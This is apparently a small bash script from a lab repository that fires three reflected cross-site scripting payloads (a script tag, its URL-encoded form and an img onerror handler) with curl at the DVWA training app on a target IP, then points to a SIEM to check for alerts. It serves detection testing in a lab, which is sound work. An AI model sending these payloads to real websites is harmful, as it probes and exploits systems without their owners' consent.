##  attack-scripts/xss_test.sh

#!/bin/bash
# XSS Simulation using curl
# Usage: ./xss_test.sh <target-ip>

TARGET=$1

if [ -z "$TARGET" ]; then
  echo "Usage: ./xss_test.sh <target-ip>"
  exit 1
fi

echo "[*] Starting XSS test on $TARGET"

# Basic XSS payload
curl -s "http://$TARGET/DVWA/vulnerabilities/xss_r/?name=<script>alert(1)</script>"

# Encoded XSS payload
curl -s "http://$TARGET/DVWA/vulnerabilities/xss_r/?name=%3Cscript%3Ealert(1)%3C%2Fscript%3E"

# Event handler XSS
curl -s "http://$TARGET/DVWA/vulnerabilities/xss_r/?name=<img src=x onerror=alert(1)>"

echo "[+] Done. Check SIEM for XSS alerts."


---
